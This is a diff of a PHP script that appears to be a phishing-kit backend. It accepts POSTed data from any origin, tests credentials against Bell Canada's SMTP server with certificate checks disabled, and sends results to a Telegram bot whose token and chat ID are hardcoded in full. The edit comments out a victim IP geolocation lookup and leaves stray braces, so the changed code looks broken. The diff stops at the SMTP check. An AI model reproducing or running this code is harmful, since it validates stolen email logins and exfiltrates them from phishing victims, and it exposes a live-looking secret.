@@ -1,69 +1,27 @@
 <?php
-// -------------------- Headers --------------------
-ob_clean();
-error_reporting(0); // suppress warnings in output
-ini_set('display_errors', 0);
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST");
 header("Access-Control-Allow-Headers: Content-Type");
+
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ob_clean();
 header('Content-Type: application/json; charset=utf-8');
 
-// -------------------- Helper Functions --------------------
-
-// Safe string output
-function safe($str) {
-    return htmlspecialchars($str ?? '', ENT_QUOTES, 'UTF-8');
-}
-
-// Generic cURL GET
-function httpGet($url, $timeout = 5) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $response = curl_exec($ch);
-    curl_close($ch);
-    return $response;
-}
-
-// Send message to Telegram
 function sendToTelegram($message) {
-    $botToken = getenv('TELEGRAM_BOT_TOKEN') ?: '7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q';
-    $chatId   = getenv('TELEGRAM_CHAT_ID') ?: '7394958970';
+    $botToken = '7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q';
+    $chatId   = '7394958970';
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
-
     $params = [
         'chat_id' => $chatId,
         'text' => $message,
         'parse_mode' => 'HTML'
     ];
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_exec($ch);
-    curl_close($ch);
+    @file_get_contents($url . '?' . http_build_query($params));
 }
 
-// Get location info from IP
-function getLocation($ip) {
-    $url = "http://ip-api.com/json/{$ip}?fields=country,regionName,city,query";
-    $response = httpGet($url);
-    if ($response) {
-        $loc = json_decode($response, true);
-        if (is_array($loc)) {
-            $city       = $loc['city']       ?? 'Unknown City';
-            $regionName = $loc['regionName'] ?? 'Unknown Region';
-            $country    = $loc['country']    ?? 'Unknown Country';
-            $queryIP    = $loc['query']      ?? $ip;
-            return "$city, $regionName, $country (IP: $queryIP)";
-        }
-    }
-    return "Unknown Location (IP: $ip)";
+function safe($str) {
+    return htmlspecialchars($str ?? '', ENT_QUOTES, 'UTF-8');
 }
 
 // -------------------- Multilingual messages --------------------
@@ -94,7 +52,6 @@ function msg($key, $lang, $messages) {
     return $messages[$lang][$key] ?? $messages['en'][$key];
 }
 
-// -------------------- Main --------------------
 $response = ["status" => "error", "message" => msg('unknown_error', 'en', $messages)]; 
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -126,10 +83,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 
     // Get IP & location
-    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
-    $locationText = getLocation($ip);
+   // $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
+   // $locationData = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query");
+   // $locationText = '';
+   // if ($locationData) {
+       // $loc = json_decode($locationData, true);
+       // if (is_array($loc)) {
+           // $city       = $loc['city']       ?? 'Unknown City';
+          //  $regionName = $loc['regionName'] ?? 'Unknown Region';
+          //  $country    = $loc['country']    ?? 'Unknown Country';
+          //  $queryIP    = $loc['query']      ?? $ip;
+          //  $locationText = "$city, $regionName, $country (IP: $queryIP)";
+        }
+    }
 
-    // SMTP check (⚠️ may be blocked on Render)
+    // SMTP check
     $server = 'ssl://smtpa.bellnet.ca';
     $port   = 465;
     $contextOptions = ['ssl' => ['verify_peer'=>false,'verify_peer_name'=>false,'allow_self_signed'=>true]];
